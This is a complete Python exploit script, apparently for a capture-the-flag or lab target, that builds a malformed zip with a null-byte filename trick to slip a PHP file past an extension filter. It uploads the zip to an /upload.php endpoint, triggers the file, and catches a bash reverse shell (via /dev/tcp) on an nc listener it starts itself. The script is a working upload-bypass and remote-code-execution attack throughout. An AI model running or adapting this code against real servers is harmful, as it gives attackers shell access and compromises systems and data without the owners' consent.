#!/usr/bin/env python3

import requests
import argparse
import struct
import binascii
import threading
import os

class Zip:

  # Getting the arguments from the user
  def build_args(self):
    parser = argparse.ArgumentParser(prog='zip.py',description='Build a malicious zip')
    parser.add_argument('-l','--listener',help='IP to listen on',required=True)
    parser.add_argument('-p','--port',help='Port to listen on',required=True)
    parser.add_argument('-t','--target',help='Target',required=True)
    args = parser.parse_args()

    # Storing args.listener and args.port as instance attributes, so other methods can have access to them in the same instance of the class
    self.listener = args.listener
    self.port = args.port
    return args

  # Building the payload
  def build_payload(self,args):
    payload = b"""<?php system("bash -c 'bash -i >& /dev/tcp/""" + args.listener.encode() + b"""/""" + args.port.encode() + b""" 0>&1'"); ?>"""
    length = len(payload)
    filename1 = b'evil.php.pdf' 
    filename2 = b'evil.php\x00.pdf' # name of the file inside of the zip, using a null byte after .php to bypass the waf which wants the extension to be .pdf but we need to exec php code, so the actual filename will be evil.php after getting past the waf and having the file uploaded
    return payload,length,filename1,filename2

  # Building a zip archive by following its format found online
  def build_zip(self,payload,length,filename1,filename2):
    self.payload = payload
    self.len = length

    # Step 1. Building the local file header
    local_file_header  = b'' 
    local_file_header += b'\x50\x4b\x03\x04' # signature of the local file header
    local_file_header += b'\x14\x00'         # version
    local_file_header += b'\x00\x00'         # flags (we've set it to no flags)
    local_file_header += b'\x00\x00'         # compression (we've set it to no compression)
    local_file_header += b'\x4f\x4a'         # file modification time, zip up any file, xxd the archive and just these 2 bytes, doesn't really matter
    local_file_header += b'\x1d\x57'         # file modification date, same as above
    crc32_checksum = binascii.crc32(payload)
    local_file_header += struct.pack('<L',crc32_checksum)        # checksum in little endian format
    local_file_header += struct.pack('<L',length)                # compressed size
    local_file_header += struct.pack('<L',length)                # uncompressed size
    local_file_header += struct.pack('<H',len(filename1))        # filename length
    local_file_header += b'\x00\x00'                             # extra field length
    local_file_header += filename1 # filename
    local_file_header += payload   # extra field

    # Step 2. Building the central directory record
    central_directory  = b''
    central_directory += b'\x50\x4b\x01\x02' # signature
    central_directory += b'\x14\x03'         # version
    central_directory += b'\x14\x00'         # version needed
    central_directory += b'\x00\x00'         # flags
    central_directory += b'\x00\x00'         # compression
    central_directory += b'\x4f\x4a'         # file modification time
    central_directory += b'\x1d\x57'         # file modification date
    central_directory += struct.pack('<L',crc32_checksum)        # checksum in little endian format
    central_directory += struct.pack('<L',length)                # compressed size
    central_directory += struct.pack('<L',length)                # uncompressed size
    central_directory += struct.pack('<H',len(filename2))        # filename length
    central_directory += b'\x00\x00' # extra field length
    central_directory += b'\x00\x00' # file comment length
    central_directory += b'\x00\x00' # disk # start
    central_directory += b'\x00\x00' # internal attributes
    central_directory += b'\x00\x00\xa4\x81' # external attributes
    central_directory += b'\x00\x00\x00\x00' # offset of local header
    central_directory += filename2   # filename

    # Step 3. Building the end of the central directory record
    end_of_cd = b''
    end_of_cd += b'\x50\x4b\x05\x06' # signature
    end_of_cd += b'\x00\x00'         # disk number
    end_of_cd += b'\x00\x00'         # disk # w/cd
    end_of_cd += b'\x01\x00'         # disk entries
    end_of_cd += b'\x01\x00'         #  total entries
    end_of_cd += struct.pack('<L', len(central_directory)) # central directory size
    end_of_cd += struct.pack('<L', len(local_file_header)) # offset of cd wrt to starting disk
    end_of_cd += b'\x00\x00' # comment length
    end_of_cd += b'\x00\x00' # zip file comment
    final_payload = local_file_header + central_directory + end_of_cd
    return final_payload

  # Write the zip to disk
  def create_zip(self,payload):
    with open('/tmp/evil.zip', 'wb') as f:
      f.write(payload)
      print('\n[+] Successfully created /tmp/evil.zip\n')

  # Upload evil.zip
  def make_req(self,args,final_payload):
    if 'http://' not in args.target:
      url = 'http://' + args.target
    else:
      url = args.target
    files = {'submit':(None,''),'zipFile':('evil.zip',final_payload)}
    r = requests.post(url + '/upload.php', files=files)
    # Extract the actual path that we need to hit
    for line in r.text.split('\n'):
      if 'uploads' in line:
        uploaded_file = line.split('"')[1].split(' ')[0]
        # Make a GET request to trigger the revshell
        print("\n[+] File found, triggering the revshell ...\n")
        requests.get(url + '/' + uploaded_file)

  # Create a thread to run nc in the background and listen on the provided port and interface
  def start_listener(self):
    os.system(f'$(which nc) -lvnp {self.port} -s {self.listener}')

  # Cleanup
  def cleanup(self):
    os.system("/usr/bin/rm /tmp/evil.zip")
    print("\n\n[+] Cleaning up /tmp/evil.zip ...\n")

def main():
  myzip = Zip()
  args = myzip.build_args()
  payload, length, filename1, filename2 = myzip.build_payload(args)
  final_payload = myzip.build_zip(payload,length,filename1,filename2)
  myzip.create_zip(final_payload)
  listener = threading.Thread(target=myzip.start_listener)
  listener.start()
  myzip.make_req(args,final_payload)
  myzip.cleanup()

if __name__=='__main__':
  main()
